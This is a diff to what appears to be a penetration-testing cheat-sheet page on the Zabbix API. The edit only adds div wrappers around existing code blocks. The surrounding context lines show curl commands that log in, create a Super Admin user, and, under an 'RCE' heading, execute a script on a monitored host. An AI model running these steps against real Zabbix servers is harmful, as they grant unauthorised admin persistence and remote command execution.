@@ -9,6 +9,8 @@ tags: ["zabbix", "api", "monitoring"]
 
 #### General
 
+<div>
+
 ```bash
 # Auth with cred
 curl http://example.com/zabbix/api_jsonrpc.php -H "Content-Type: application/json-rpc" -d '{"jsonrpc":"2.0", "method":"user.login", "id":1, "auth":null, "params":{"user": "<USER>", "password": "<PASSWORD>"}}'
@@ -44,7 +46,11 @@ curl -s http://example.com/zabbix/api_jsonrpc.php -H "Content-Type: application/
 curl -s http://example.com/zabbix/api_jsonrpc.php -H "Content-Type: application/json-rpc" -d '{"jsonrpc":"2.0", "method":"user.create", "id":1, "auth":"<AUTH>", "params":{"passwd": "<PASSWORD>", "usrgrps": [{"usrgrpid": "7"}], "alias": "<USER>", "type": "3"}}' | jq -c '.'
 ```
 
+</div>
+
 #### RCE
+
+<div>
 
 ```bash
 # Create script on container 0 (default 1)
@@ -60,5 +66,7 @@ curl -s http://example.com/zabbix/api_jsonrpc.php -H "Content-Type: application/
 # Execute script (e.g. scriptid 4)
 curl -s http://example.com/zabbix/api_jsonrpc.php -H "Content-Type: application/json-rpc" -d '{"jsonrpc":"2.0", "method":"script.execute", "id":1, "auth":"<AUTH>", "params":{"hostid": 10106, "scriptid": 4}}' | jq .
 ```
+
+</div>
 
 <br>
